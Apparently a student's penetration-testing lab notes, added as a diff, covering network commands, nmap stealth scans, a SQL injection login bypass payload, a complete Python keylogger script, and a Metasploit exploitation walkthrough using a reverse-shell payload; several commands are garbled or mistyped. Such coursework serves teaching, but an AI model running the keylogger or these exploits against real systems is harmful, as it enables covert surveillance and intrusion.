@@ -1,0 +1,179 @@
+prac 3:
+o Execute the ifconfig command to retrieve network interface information.
+
+1. Ifconfig
+ 
+
+o Use the ping command to test network connectivity and analyze the output.
+
+2.ping google.com
+ 
+o Analyze the netstat command output to view active network connections.
+
+3. netstat
+ 
+o Perform a traceroute to trace the route packets take to reach a target host.
+
+4.traceroute google.com
+ 
+
+
+ 
+
+Windows:
+
+ipconfig
+
+ 
+
+ping
+ 
+netstat
+ 
+
+tracert www.google.com
+
+Prac4
+
+Step 2 : Type “scanme.nmap.org” to check nmap
+ACK-SA (TCP ACK scan)
+COMMAND: nmap -sA-T4 scanme.nmap.org
+ 
+ 
+
+•	Perform SYN, FIN, NULL, and XMAS scans to identify open ports and their
+
+1 SYN (Stealth) Scan (-sS)
+COMMAND: nmap -p22,113,139 scanme.nmap.org
+ 
+
+ 
+
+2 FIN (-sF)
+COMMAND: nmap-sF-T4 scanme.name.org
+ 
+ 
+
+3 NULL Scan (-sN)
+COMMAND: nmap-sN -p 22 scanme.nmap.org
+ 
+ 
+
+4 XMAS Scan (-sX)
+COMMAND: nmap -sX-T4 scanme.nmap.org
+ 
+
+ 
+
+
+
+
+
+
+prac8
+
+Step 4: Enter User ID as a 1’OR ‘1’=’1’#
+ 
+
+ 
+Step 5: Enter ID as 2
+ 
+Step 6: Enter ID as 3
+ 
+Step 7: Enter ID as 4
+ 
+Step 8: Enter ID as 1=1
+ 
+
+
+
+ 
+
+Keylogger.pyw
+from pynput.keyboard import Key, Listener
+import logging
+
+# Specify the location where the log will be saved
+log_dir = "keylog.txt"
+
+# Set up logging configuration (this will log the keys pressed to a text file)
+logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+# Define the function that gets called when a key is pressed
+def on_press(key):
+    logging.info(str(key))
+
+# Set up the listener to monitor keyboard events
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+	Execute the keylogger script and observe the logged keystrokes.
+ 
+ 
+
+ 
+
+ 
+PRACTICAL NO 10
+By Chandan
+(Under the guidance of Dr. Charul Singh)
+Aim:
+Exploiting with Metasploit (Kali Linux)
+●	Identify a vulnerable system and exploit it using Metasploit modules.
+●	Gain unauthorized access to the target system and execute commands or extract information.
+●	Understand the ethical considerations and legal implications of using Metasploit
+for penetration testing.
+Solution:
+
+	Identify a vulnerable system and exploit it using Metasploit modules.
+Step1: Write command “msfconsole”
+ 
+ 
+Step2: Use msf6 > search tcp
+ 
+Step 3: Use msf6 > use exploit/multi/browser/msfd_rce_browser
+ 
+Step 4: msf6 exploit(multi/browser/msfd_rce_browser) > show -h options
+ 
+Step 5: msf6 exploit(multi/browser/msfd_rce_browser) > set srvport 1244
+srvport => 1244
+ 
+Step 6: msf6 exploit(multi/browser/msfd_rce_browser) > show options
+ 
+Step 7: msf6 exploit(multi/browser/msfd_rce_browser) > set ssl true
+ 
+
+Step 8: msf6 exploit(multi/browser/msfd_rce_browser) > show options
+
+ 
+
+Step 9: msf6 exploit(multi/browser/msfd_rce_browser) > show payloads
+ 
+Step 10: msf6 exploit(multi/browser/msfd_rce_browser) > set payload ruby/shell_reverse_tcp
+payload => ruby/shell_reverse_tcp
+ 
+Step 11: msf6 exploit(multi/browser/msfd_rce_browser) > show options
+ 
+
+
+Step 12: In victim pc ipconfig
+ 
+Step 13: msf6 exploit(multi/browser/msfd_rce_browser) > set lhost 192.168.90.114
+
+ 
+
+Step 14: msf6 exploit(multi/browser/msfd_rce_browser) > show options
+ 
+
+
+
+
+
+Step 15: msf6 exploit(multi/browser/msfd_rce_browser) > exploit
+ls -a
+ 
+
+
+
+
+
